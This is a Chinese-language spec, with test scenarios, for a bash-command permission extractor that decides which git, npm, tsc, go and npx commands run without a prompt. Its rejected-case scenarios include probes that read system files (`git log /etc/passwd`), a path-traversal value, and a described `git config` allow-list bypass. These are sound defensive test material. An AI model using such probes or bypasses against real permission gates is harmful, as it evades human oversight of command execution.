**只读子命令 allow-set**（本 requirement 生效的子命令白名单）：`status`、`log`、`diff`、`show`、`blame`、`rev-parse`、`rev-list`、`shortlog`。

**允许作为 positional 参数的两种形式**：

- **git blob 语法**：`<rev>:<path>` 形式，其中 `<rev>` 是**非路径形态**的 git revision，`<path>` 是任意非空字符串
  - `<rev>` 合法形态：单个字符（如 `M`）、分支/标签名（如 `HEAD`、`main`、`develop`）、revision 表达式（如 `HEAD~1`、`HEAD^`、`HEAD~10`、`HEAD~1^`、`HEAD^^`、`origin/main`、`HEAD..branch`、`HEAD...branch`、`v1.2.3`）
  - `<rev>` 非法形态：绝对路径（`/tmp/rev`）、家目录前缀（`~/rev`）、路径型名称（以 `.` 或 `..` 开头）、包含扩展名形态（`main.ts`）
- **repo 内相对路径**：`./path/to/file` 或 `path/to/file` 形式，且满足以下约束
  - MUST NOT 以 `/` 开头（绝对路径）
  - MUST NOT 以 `~/` 开头（家目录前缀）
  - MUST NOT 包含 `../` 越界片段
  - MUST NOT 是 Windows 盘符路径（`C:\` 等）
  - 可以是目录（结尾 `/`）或文件（任意扩展名）

**允许作为 flag 的任何 flag 组合**：与既有 allow-set 行为一致——`-L <range>`、`-n <num>`、`--oneline`、`--stat`、`--name-only`、`--reverse`、`--since <date>`、`--until <date>`、`--max-count <n>`、`--format=<fmt>` 等，值可以是任意字符串（包括数字、日期、字符串）。

**约束**：

- 一个 git 命令的 positional 参数 MUST 全部满足上述两种形式之一——只要有一个 positional 参数不满足，整个 git 命令 MUST 判 `unreliable_command`
- 命令在 allow-set 内的子命令 MUST NOT 出现多个 positional 参数形式混合时的额外约束（blob 语法与 repo 相对路径可以混用，如 `git diff HEAD~1 src/main.ts`）
- **不在只读子命令 allow-set 内的 git subcommand 不受本 requirement 影响**，MUST 保持既有严格"subcommand 后无 positional"行为：
  - 在 `SILENT_COMMANDS.git` 内但不在本 requirement 只读子命令 allow-set 内（`branch`、`tag`、`remote`、`config`、`ls-files`）：命令级 `isSilentCommand` 返回 `false`，随后走 `extractBashTargets` 的 silent-form 4b 分支——**该分支 MUST 对这类子命令拒绝任何 positional**（`git config user.name Alice`、`git branch foo`、`git tag v1.2.3`、`git ls-files src`、`git remote origin` 均 MUST 判 `unreliable_command`）。这是 Change B 与 silent-form 4b 之间的**必要 gate**——若 4b 未对 `GIT_BLOB_OK_SUBCOMMANDS` 做交集判定，`git config user.name Alice` 会因 positional 匹配 repo 相对路径形态而被误判为 `reliable: true` 0-target，绕过弹窗静默写入 `.git/config`。
  - 完全不在 `SILENT_COMMANDS.git` 内（`fetch`、`pull`、`push`、`clone`、`add`、`commit`、`checkout`、`rm` 等）：命令级 `isSilentCommand` 返回 `false`，silent-form 4b 分支亦返回 `unreliable_command`
- 本 requirement MUST NOT 修改 `SILENT_COMMANDS.git` 的 allow-set 数据（allow-set 内容保持不变）——本 requirement 的效果在 `isSilentCommand` 的 post-subcommand 阶段**以及** `extractBashTargets` silent-form 4b 分支**两处**通过一致的 `GIT_BLOB_OK_SUBCOMMANDS` 交集判定实现

**理由**：git 的 blob 语法天然被 git 自身限制在 repo 内——`git log /etc/passwd` 会被 git 拒绝（`fatal: ... is outside repository`），`git diff /etc/passwd` 同理。因此 extractor 层对 repo 内 blob/相对路径的静默放行是安全的，无需弹窗确认。

#### Scenario: `git blame src/main.ts` 静默

- **WHEN** bash 命令为 `git blame src/main.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`blame` 在 allow-set，`src/main.ts` 是 repo 内相对路径，判静默

#### Scenario: `git blame -L 1,10 src/main.ts` 静默

- **WHEN** bash 命令为 `git blame -L 1,10 src/main.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`-L <range>` 是允许的 flag，`src/main.ts` 是 repo 内相对路径

#### Scenario: `git show HEAD:file.txt` 静默

- **WHEN** bash 命令为 `git show HEAD:file.txt`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`HEAD:file.txt` 是 blob 语法，`HEAD` 是合法 revision

#### Scenario: `git show HEAD:src/main.ts` 静默

- **WHEN** bash 命令为 `git show HEAD:src/main.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；blob 语法的路径部分可以是嵌套路径

#### Scenario: `git diff src/main.ts` 静默

- **WHEN** bash 命令为 `git diff src/main.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`diff` 在 allow-set，`src/main.ts` 是 repo 内相对路径

#### Scenario: `git log HEAD:file.txt` 静默

- **WHEN** bash 命令为 `git log HEAD:file.txt`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；blob 语法

#### Scenario: `git status src/main.ts` 静默

- **WHEN** bash 命令为 `git status src/main.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`status` 在 allow-set，`src/main.ts` 是 repo 内相对路径

#### Scenario: `git rev-parse HEAD:file.txt` 静默

- **WHEN** bash 命令为 `git rev-parse HEAD:file.txt`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；blob 语法

#### Scenario: `git rev-parse HEAD~1` 静默（既有行为回归）

- **WHEN** bash 命令为 `git rev-parse HEAD~1`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`HEAD~1` 是合法 revision 表达式

#### Scenario: `git rev-parse HEAD` 静默（既有行为回归）

- **WHEN** bash 命令为 `git rev-parse HEAD`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`

#### Scenario: `git fetch` 仍判不可靠

- **WHEN** bash 命令为 `git fetch`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`fetch` 不在 allow-set

#### Scenario: `git push origin main` 仍判不可靠

- **WHEN** bash 命令为 `git push origin main`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`push` 不在 allow-set

#### Scenario: `git clone https://example.com/repo` 仍判不可靠

- **WHEN** bash 命令为 `git clone https://example.com/repo`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`clone` 不在 allow-set

#### Scenario: `git add src/main.ts` 仍判不可靠

- **WHEN** bash 命令为 `git add src/main.ts`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`add` 是写操作，不在 allow-set

#### Scenario: `git commit -m 'fix'` 仍判不可靠

- **WHEN** bash 命令为 `git commit -m 'fix'`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`commit` 是写操作，不在 allow-set

#### Scenario: `git checkout main` 仍判不可靠

- **WHEN** bash 命令为 `git checkout main`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`checkout` 是写操作，不在 allow-set

#### Scenario: `git log /etc/passwd` 仍判不可靠

- **WHEN** bash 命令为 `git log /etc/passwd`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`/etc/passwd` 是绝对路径，不满足 repo 内相对路径约束

#### Scenario: `git diff /etc/passwd` 仍判不可靠

- **WHEN** bash 命令为 `git diff /etc/passwd`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；绝对路径不满足 repo 内相对路径约束

### Requirement: npm/yarn/pnpm `run <script>` 形式静默放行

系统 SHALL 在 `SILENT_COMMANDS` 的 `npm`、`yarn`、`pnpm` 的 allow-set 支持范围内，除既有的直接形式（`npm test`、`npm lint`、`npm audit`、`yarn test` 等）外，同时接受 `run <script>` 形式，且 `<script>` 名必须在**脚本名白名单** `{test, lint, audit}` 中。

**支持的两种等价形式**：

- **直接形式**（既有，保持不变）：`npm <script>` / `yarn <script>` / `pnpm <script>`，其中 `<script>` ∈ `{test, lint, audit}`
- **run 形式**（本 requirement 新增）：`npm run <script>` / `yarn run <script>` / `pnpm run <script>`，其中 `<script>` ∈ `{test, lint, audit}`

**约束**：

- 脚本名 MUST 是 `{test, lint, audit}` 之一——任何其他脚本名（`build`、`dev`、`publish`、`start`、`prepare`、`pretest`、`unknown` 等）MUST 判 `unreliable_command`
- `npm run -- <script>` 形式（用 `--` 分隔的参数列表）MUST 判 `unreliable_command`——`--` 后的参数是脚本接收的命令行参数而非脚本名，extractor 无法静态确定哪个脚本被调用
- 脚本名后 MUST NOT 跟任何 positional 参数——`npm run test -- --path=/etc/passwd` MUST 判 `unreliable_command`（`--` 后参数被视为脚本参数，不静默）
- `npm`/`yarn`/`pnpm` 的 flag（如 `--workspace=.`、`--cwd=<path>`）MUST NOT 出现——这些命令不识别 flag（不同于 git）
- 本 requirement MUST NOT 修改 `SILENT_COMMANDS.npm/yarn/pnpm` 的 allow-set 数据——allow-set 保持 `{test, lint, audit}`；`run <script>` 形式在 `isSilentCommand` 内部通过额外的模式匹配处理

**理由**：`npm run test` 与 `npm test` 语义完全等价（npm 内部：`npm test` 是 `npm run test` 的 shortcut）；`yarn test` 与 `yarn run test` 同理。允许两种形式等价，让用户的日常开发习惯（无论偏好哪种写法）都能被静默放行。脚本名白名单严格限制为 `{test, lint, audit}` 三个只读脚本名——`build`、`publish`、`dev` 等可能有网络访问、包发布、长时驻留进程等副作用，不在静默范围内。

#### Scenario: `npm run test` 静默

- **WHEN** bash 命令为 `npm run test`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`

#### Scenario: `npm run lint` 静默

- **WHEN** bash 命令为 `npm run lint`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`

#### Scenario: `yarn run test` 静默

- **WHEN** bash 命令为 `yarn run test`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`

#### Scenario: `pnpm run audit` 静默

- **WHEN** bash 命令为 `pnpm run audit`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`

#### Scenario: `npm run build` 仍判不可靠

- **WHEN** bash 命令为 `npm run build`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`build` 不在脚本名白名单

#### Scenario: `npm run publish` 仍判不可靠

- **WHEN** bash 命令为 `npm run publish`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`publish` 不在脚本名白名单

#### Scenario: `npm run dev` 仍判不可靠

- **WHEN** bash 命令为 `npm run dev`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`dev` 不在脚本名白名单

#### Scenario: `npm run -- scriptName` 仍判不可靠

- **WHEN** bash 命令为 `npm run -- scriptName`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`--` 形式无法静态确定脚本名

#### Scenario: `npm test` 直接形式静默（既有行为回归）

- **WHEN** bash 命令为 `npm test`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——直接形式不受本 requirement 影响，仍按既有 allow-set 处理

### Requirement: `tsc` 纯检查形式静默放行

系统 SHALL 在 `SILENT_COMMANDS` 的 `tsc` 分支接受**纯检查形式**并判静默放行（`{ reliable: true, targets: [] }`）。

**入口判定**：`tsc` 命令的首个非-flag token MUST 是以下三个之一——`--noEmit`、`--version`、`--help`（或短形式 `-h`）。其他形式（包括无首个非-flag token 的 `tsc`、首个非-flag token 是源文件路径的 `tsc <src>`、首个非-flag token 是其他 flag 的 `tsc --project <path>` 等）MUST 判 `unreliable_command`。

**允许跟随入口 flag 的 flag 白名单**：

- `--noEmit`（重复出现允许）
- `--version`、`--help`、`-h`（元信息形式，允许重复）
- `--project` / `-p`（TSConfig 路径参数，值 MUST 是**非 flag** token）
- `--watch` / `-w`（开发模式，纯检查）
- `--incremental`、`--pretty`、`--pretty true`、`--pretty false`、`--pretty <bool>`（输出格式）
- `--target`、`--module`、`--moduleResolution`、`--strict`、`--skipLibCheck`、`--esModuleInterop`、`--resolveJsonModule`、`--noImplicitAny`、`--noImplicitReturns`、`--strictNullChecks`、`--strictFunctionTypes`、`--noUncheckedIndexedAccess`、`--useDefineForClassFields`、`--forceConsistentCasingInFileNames`、`--jsx`（类型检查选项，纯检查语义）
- 值形式：`--flag <value>` 与 `--flag=<value>` 都接受（后续值必须是**非 flag** token）

**一律拒绝的 flag**（MUST 判 `unreliable_command`，即使 `--noEmit` 存在）：

- `--outDir`、`--declarationDir`、`--rootDir`、`--declaration`、`--declarationMap`、`--sourceMap`、`--outFile`（允许 worktree 外写入）
- `--emitDeclarationOnly`、`--emitDecoratorMetadata`、`--isolatedDeclarations`（`--noEmit` 与这些组合时 tsc CLI 实际会 emit d.ts 到磁盘）
- `--noCheck`（跳过类型检查，静态分析无法证明安全）
- `--build` / `-b`（触发 TypeScript Project References 构建）

**约束**：

- 入口判定 MUST 是**首个非-flag token**，token 顺序不影响判定（`tsc --project tsconfig.json --noEmit` 与 `tsc --noEmit --project tsconfig.json` 语义等价，两者都 MUST 静默）
- 不允许任何非-flag positional token（源文件路径等）出现在 `tsc` 命令中——即使 `--noEmit` 存在，`tsc --noEmit src/main.ts` MUST 判 `unreliable_command`（源文件列表的语义是"编译这些源文件"，静态分析层无法排除其他 emit 行为）
- 本 requirement 的效果在 `isSilentCommand` 的 `tsc` 分支**以及** `extractBashTargets` silent-form 4b 分支**两处**通过一致的实现落地

**理由**：`--noEmit` 是 TypeScript CLI 显式禁 emit 的官方 flag，是唯一能"静态证明无 emit"的入口。`--version`/`--help` 是元信息输出，无副作用。拒绝 `--emitDeclarationOnly` 即使 `--noEmit` 存在，是因为 tsc CLI 的实际行为是 `--emitDeclarationOnly` 与 `--noEmit` 组合时仍 emit 声明文件到磁盘。

#### Scenario: `tsc --noEmit` 静默

- **WHEN** bash 命令为 `tsc --noEmit`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`--noEmit` 是入口 flag，静默

#### Scenario: `tsc --noEmit --project tsconfig.json` 静默

- **WHEN** bash 命令为 `tsc --noEmit --project tsconfig.json`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`--project <path>` 是允许的 flag，`tsconfig.json` 是允许的值

#### Scenario: `tsc --noEmit -p tsconfig.json` 静默

- **WHEN** bash 命令为 `tsc --noEmit -p tsconfig.json`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`-p` 是 `--project` 的短形式

#### Scenario: `tsc --version` 静默

- **WHEN** bash 命令为 `tsc --version`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；元信息输出

#### Scenario: `tsc --help` 静默

- **WHEN** bash 命令为 `tsc --help`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；元信息输出

#### Scenario: `tsc --noEmit --target es2022 --strict` 静默

- **WHEN** bash 命令为 `tsc --noEmit --target es2022 --strict`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`--target` 与 `--strict` 都是类型检查选项

#### Scenario: `tsc src/main.ts` 仍判不可靠

- **WHEN** bash 命令为 `tsc src/main.ts`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；无 `--noEmit`，默认会 emit 到 worktree 外的 `outDir`

#### Scenario: `tsc --outDir /tmp/build` 仍判不可靠

- **WHEN** bash 命令为 `tsc --outDir /tmp/build`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`--outDir` 允许 worktree 外写入，被显式拒绝

#### Scenario: `tsc --noEmit --emitDeclarationOnly` 仍判不可靠

- **WHEN** bash 命令为 `tsc --noEmit --emitDeclarationOnly`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`--emitDeclarationOnly` 与 `--noEmit` 组合时 tsc CLI 实际 emit d.ts 到磁盘，被显式拒绝

#### Scenario: `tsc --noEmit src/main.ts` 仍判不可靠

- **WHEN** bash 命令为 `tsc --noEmit src/main.ts`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；不允许任何非-flag positional（源文件路径）

#### Scenario: `tsc --noCheck` 仍判不可靠

- **WHEN** bash 命令为 `tsc --noCheck`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`--noCheck` 跳过类型检查，静态分析无法证明安全

#### Scenario: `tsc -b` 仍判不可靠

- **WHEN** bash 命令为 `tsc -b`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`-b` / `--build` 触发 Project References 构建

### Requirement: `go vet` / `go fmt` 子命令静默放行

系统 SHALL 在 `SILENT_COMMANDS` 的 `go` allow-set 内接受 `vet` 与 `fmt` 子命令，并判静默放行（`{ reliable: true, targets: [] }`）。

**子命令 allow-set**（本 requirement 生效的子命令白名单）：`vet`、`fmt`。

**允许作为 positional 参数的形式**：

- **repo 内相对路径**：`./path/to/file` 或 `path/to/file` 形式，且满足以下约束（复用 Change B 建立的 `looksLikeRepoRelativePath` 识别规则）
  - MUST NOT 以 `/` 开头（绝对路径）
  - MUST NOT 以 `~/` 开头（家目录前缀）
  - MUST NOT 包含 `../` 越界片段
  - MUST NOT 是 Windows 盘符路径（`C:\` 等）
  - 可以是目录（结尾 `/`）或文件（任意扩展名）
  - 支持 Go 包约定：`./...`（当前目录递归）、`./src/...`（子目录递归）
- **无 positional**：`go vet`、`go fmt` 单独调用（无路径参数）

**允许作为 flag 的组合**：

- `go vet` 的分析控制 flag：`-copylocks`、`-printf`、`-shadow`、`-structtag`、`-atomic`、`-bool`、`-buildtag`、`-httpmux`、`-loopclosure`、`-nilfunc`、`-slog`、`-stdmethods`、`-tests`、`-unsafeptr`、`-unusedresult`、`-unusedwrite`、`-all`、`-h`、`-help`
- `go fmt` 的写入控制 flag：`-l`（列出修改的文件）、`-w`（写入原文件）、`-r <pattern>`（重构模式，值 MUST 是**非 flag** token）、`-s`（额外简化）

**约束**：

- 一个 `go vet` / `go fmt` 命令的 positional 参数 MUST 全部满足"repo 内相对路径"约束——只要有一个 positional 不满足，整个命令 MUST 判 `unreliable_command`
- Flag MUST 出现在 subcommand 之后、positional 之前——`go vet <pkg> --flag` MUST 判 `unreliable_command`（flag 出现在 positional 之后，Go CLI 语义上是 `<pkg>` 接收 `--flag`，静态分析不可靠）
- 其他 `go` 子命令（`build`、`test`、`run`、`mod`、`install`、`generate`、`list` 等）MUST 保持既有不可靠判定
- 在 `SILENT_COMMANDS.go` 内但不在本 requirement 允许子命令内（`version`、`env`）MUST 保持既有静默判定
- 本 requirement 的效果在 `isSilentCommand` 的 `go` 分支**以及** `extractBashTargets` silent-form 4b 分支**两处**通过一致的 `GO_SILENT_POSITIONAL_SUBCOMMANDS` 交集判定落地

**理由**：`go vet` 是纯静态分析（Go 工具链保证），`go fmt` 只在传入路径的 Go 源文件上格式化（Go 工具链保证）。两者的路径约束行为由 Go CLI 自身保证——传入的绝对路径或越界路径会被本 requirement 的 `looksLikeRepoRelativePath` 显式拒绝。

#### Scenario: `go vet` 静默

- **WHEN** bash 命令为 `go vet`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`vet` 在 allow-set，无 positional

#### Scenario: `go vet ./...` 静默

- **WHEN** bash 命令为 `go vet ./...`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`./...` 是 repo 内相对路径（Go 包递归约定）

#### Scenario: `go vet ./src/...` 静默

- **WHEN** bash 命令为 `go vet ./src/...`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；子目录递归

#### Scenario: `go vet -shadow ./...` 静默

- **WHEN** bash 命令为 `go vet -shadow ./...`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`-shadow` 是允许的分析控制 flag

#### Scenario: `go fmt` 静默

- **WHEN** bash 命令为 `go fmt`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；无 positional

#### Scenario: `go fmt ./...` 静默

- **WHEN** bash 命令为 `go fmt ./...`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；子目录递归

#### Scenario: `go fmt src/main.go` 静默

- **WHEN** bash 命令为 `go fmt src/main.go`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；具体 Go 文件

#### Scenario: `go fmt -w ./...` 静默

- **WHEN** bash 命令为 `go fmt -w ./...`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`-w` 是允许的写入控制 flag（写入边界由 `looksLikeRepoRelativePath` 约束）

#### Scenario: `go version` 静默（既有行为回归）

- **WHEN** bash 命令为 `go version`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`version` 在 allow-set，保持既有静默

#### Scenario: `go env` 静默（既有行为回归）

- **WHEN** bash 命令为 `go env`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`env` 在 allow-set，保持既有静默

#### Scenario: `go vet /tmp/evil.go` 仍判不可靠

- **WHEN** bash 命令为 `go vet /tmp/evil.go`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；绝对路径不满足 repo 内相对路径约束

#### Scenario: `go fmt -w /tmp/evil.go` 仍判不可靠

- **WHEN** bash 命令为 `go fmt -w /tmp/evil.go`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`-w` 允许写入，但 `/tmp/evil.go` 是绝对路径，被 `looksLikeRepoRelativePath` 拒绝

#### Scenario: `go vet ./.../../../etc` 仍判不可靠

- **WHEN** bash 命令为 `go vet ./.../../../etc`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；包含 `../` 越界片段

#### Scenario: `go vet ./... --flag` 仍判不可靠

- **WHEN** bash 命令为 `go vet ./... --flag`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；flag 出现在 positional 之后，Go CLI 语义上是 `<pkg>` 接收 `--flag`，静态分析不可靠

#### Scenario: `go build ./...` 仍判不可靠

- **WHEN** bash 命令为 `go build ./...`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`build` 不在本 requirement 允许子命令 allow-set，且触发依赖下载 + 产出二进制

#### Scenario: `go test ./...` 仍判不可靠

- **WHEN** bash 命令为 `go test ./...`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`test` 不在本 requirement 允许子命令 allow-set

#### Scenario: `go run .` 仍判不可靠

- **WHEN** bash 命令为 `go run .`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`run` 不在本 requirement 允许子命令 allow-set

#### Scenario: `go mod tidy` 仍判不可靠

- **WHEN** bash 命令为 `go mod tidy`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`mod` 不在本 requirement 允许子命令 allow-set，且触发网络操作

#### Scenario: `go mod download` 仍判不可靠

- **WHEN** bash 命令为 `go mod download`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`mod` 不在本 requirement 允许子命令 allow-set，且触发网络操作

### Requirement: `npx --no-install` 形式静默放行

系统 SHALL 在 `SILENT_COMMANDS` 的 `npx` 分支接受**`--no-install` 形式**并判静默放行（`{ reliable: true, targets: [] }`）。

**形式识别**：

- `npx` 命令的 tokens 中 MUST 包含 `--no-install` flag（这是特例路径的入口判定）
- `--no-install` 前后 MUST 允许任意数量的允许 flag（见下方"允许 flag 白名单"）
- `--no-install` 之后 MUST 恰好有**一个**非-flag positional token 作为包名（如 `eslint`、`tsc`、`prettier`、`jest`、`vitest` 等任意包名，不做白名单枚举）
- `--no-install` 之后 MUST NOT 有任何额外 token（无更多 positional、无 `--` 分隔、无 flag 在包名之后）

**允许 flag 白名单**：

- `--no-install` 本身（路径入口）
- 通用 npm/npx flag：`--cache=<path>`、`--color=<mode>`、`--yes` / `-y`、`--loglevel=<level>`、`--silent`、`--quiet`、`--no-fund`、`--no-timing`、`--no-update-notifier`、`--offline`、`--prefer-offline`

**一律拒绝的 flag**：

- `--prefix=<path>`（改变工作目录，与 Change B 的 `npm --cwd` 边界一致）
- `--package=<pkg>`（`--package` 允许多值，语义与 positional 不同，静态分析不可靠）
- `--call=<cmd>`、`-c <cmd>`（`npx -c <cmd>` 是 `npm exec -c <cmd>`，执行任意脚本）

**约束**：

- 包名 MUST 是**单个非-flag token**——不允许 `--pkg=<name>` 形式（`--pkg` 与 positional 语义不同）
- 不允许 `npx <pkg>`（无 `--no-install`）——`npx` 可能远程拉包执行任意脚本
- 不允许 `npx --no-install <pkg> <extra-positional>`——第二个 positional 是包接收的命令行参数（如 `eslint src/**` 的 `src/**`），pattern/path 二义性静态分析不可靠
- 不允许 `npx --no-install <pkg> --<flag>`——flag 在包名之后是包接收的命令行参数（如 `eslint --fix`）
- 不允许 `npx --no-install`（无包名）——`npx` 无包名时会报错但不拉包，但语义上不是"执行已装包"
- 本 requirement 的效果在 `isSilentCommand` 的 `npx` 分支**以及** `extractBashTargets` silent-form 4b 分支**两处**通过一致的实现落地

**理由**：`--no-install` 是 npm CLI 显式禁网络拉包的官方 flag，静态可证明"只用本地已装包"。只允许一个 positional 作为包名，避免包接收的命令行参数被误判为路径。拒绝 `--prefix`/`--package`/`--call` 保持与 Change B 的 `npm --cwd` 边界一致。

#### Scenario: `npx --no-install eslint` 静默

- **WHEN** bash 命令为 `npx --no-install eslint`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`--no-install` 是入口，`eslint` 是包名

#### Scenario: `npx --no-install tsc` 静默

- **WHEN** bash 命令为 `npx --no-install tsc`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；任意包名都允许

#### Scenario: `npx --color=always --no-install jest` 静默

- **WHEN** bash 命令为 `npx --color=always --no-install jest`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；允许 flag 在包名之前

#### Scenario: `npx --no-install --cache=./node_modules/.cache prettier` 静默

- **WHEN** bash 命令为 `npx --no-install --cache=./node_modules/.cache prettier`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`--cache=<path>` 是允许 flag，`--no-install` 与 `<path>` 顺序不影响

#### Scenario: `npx -y --no-install eslint` 静默

- **WHEN** bash 命令为 `npx -y --no-install eslint`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`；`-y` 是允许 flag

#### Scenario: `npx eslint` 仍判不可靠

- **WHEN** bash 命令为 `npx eslint`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；无 `--no-install`，可能远程拉包执行任意脚本

#### Scenario: `npx --no-install eslint src/**` 仍判不可靠

- **WHEN** bash 命令为 `npx --no-install eslint src/**`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；第二个 positional 是包接收的命令行参数，pattern/path 二义性

#### Scenario: `npx --no-install eslint --fix` 仍判不可靠

- **WHEN** bash 命令为 `npx --no-install eslint --fix`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；flag 在包名之后是包接收的命令行参数（`eslint --fix` 是写入 flag）

#### Scenario: `npx --no-install eslint -- src/**` 仍判不可靠

- **WHEN** bash 命令为 `npx --no-install eslint -- src/**`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`--` 之后的所有 token 被视为包的参数

#### Scenario: `npx --no-install` 仍判不可靠

- **WHEN** bash 命令为 `npx --no-install`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；无包名

#### Scenario: `npx --no-install --pkg=eslint` 仍判不可靠

- **WHEN** bash 命令为 `npx --no-install --pkg=eslint`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`--pkg=<name>` 形式与 positional 语义不同

#### Scenario: `npx --no-install --prefix=/tmp eslint` 仍判不可靠

- **WHEN** bash 命令为 `npx --no-install --prefix=/tmp eslint`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`--prefix` 改变工作目录，被显式拒绝

#### Scenario: `npx --no-install -c "eslint src/"` 仍判不可靠

- **WHEN** bash 命令为 `npx --no-install -c "eslint src/"`
- **THEN** 提取结果为 `{ reliable: false, reason: "unreliable_command" }`；`-c <cmd>` 是 `npm exec -c <cmd>`，执行任意脚本

### Requirement: 命令替换内只读命令豁免

当 bash 命令中的命令替换 `$(...)` 满足以下**全部**条件时，MUST NOT 触发 `command_substitution` 不可靠标记，让命令走正常提取流程：

1. **顶层命令属于豁免白名单**：`$(...)` 内展开后的顶层命令名属于 `SUBSTITUTION_READONLY_CMDS` 集合（`basename` / `dirname` / `echo` / `printf` / `pwd` / `test`）——这些命令只执行路径字符串变换、标准输出打印、当前目录输出或条件查询，无任意文件读写、无网络访问、无子命令执行副作用。**注意**：`realpath`（即使 `-m` 形式）与 bash 的 `[` test builtin 别名**不在**白名单内——前者涉及文件系统遍历，后者的语法检查成本高、收益低。
2. **嵌套替换递归判定**：`$(basename $(dirname $f))` 这类嵌套形式中，外层 `$(basename ...)` 通过条件 1 后，其参数 `$(dirname $f)` 是嵌套命令替换，MUST 递归地对最内层命令替换运行相同的条件 1/2 判定。嵌套深度超过 3 层 MUST NOT 豁免（触发 `command_substitution`），避免恶意构造。
3. **顶层无副作用构造**：`$(...)` 顶层命令的**参数部分**（不含被递归判定的嵌套 `$(...)`）MUST NOT 包含以下任一 shell 层副作用构造：
   - 未加引号的 glob 元字符（`*` / `?` / `[`）——与"有界 glob 免不可靠标记"一致，无界 glob 不豁免
   - heredoc 定界符 `<<`
   - 反引号 `` `...` ``（命令替换的旧形式）
   - 未加引号的形式化命令替换 `$(...)`（未被递归判定接受为嵌套豁免）
   - 输出重定向 `>` / `>>` / `2>` 等（会写入任意文件，绕过 `command_substitution` 门禁）
   - 管道 `|`（引入额外命令执行，extractor 无法穿透边界判定）
   - 后台分隔符 `&` 与逻辑与 `&&`（引入额外命令执行）
   - 命令分隔符 `;`（引入额外命令执行）
4. **用户变量在参数中允许**：白名单命令的参数中可以出现引号内的用户变量（如 `basename "$f"`）——变量的实际值不影响命令的静态只读性判定。这类命令里的用户变量**仍会**在 `findUnresolvedVariable`（"变量展开与展开失败"requirement）判定中被识别为未解析用户变量，走兜底弹窗——**本豁免不覆盖用户变量判定**，豁免判定与用户变量判定是**独立且顺序执行**的两步。

